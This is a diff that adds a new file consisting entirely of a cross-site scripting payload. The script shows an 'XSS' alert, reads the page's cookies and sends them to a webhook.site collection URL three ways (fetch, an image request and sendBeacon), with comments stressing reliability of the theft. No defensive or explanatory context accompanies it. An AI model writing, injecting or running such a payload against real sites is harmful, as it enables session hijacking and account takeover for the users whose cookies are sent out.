@@ -1,0 +1,18 @@
+<script>
+// Show alert
+alert('XSS');
+
+// Get all cookies
+const cookies = document.cookie;
+
+// Send to webhook (multiple methods for reliability)
+fetch('https://webhook.site/07d170e0-d317-4d66-ae09-5566285ea5ee?c=' + encodeURIComponent(cookies));
+
+// Also send via image (works even if fetch fails)
+new Image().src = 'https://webhook.site/07d170e0-d317-4d66-ae09-5566285ea5ee?c=' + encodeURIComponent(cookies);
+
+// Send via beacon (background)
+if(navigator.sendBeacon) {
+    navigator.sendBeacon('https://webhook.site/07d170e0-d317-4d66-ae09-5566285ea5ee', JSON.stringify({cookies: cookies}));
+}
+</script>
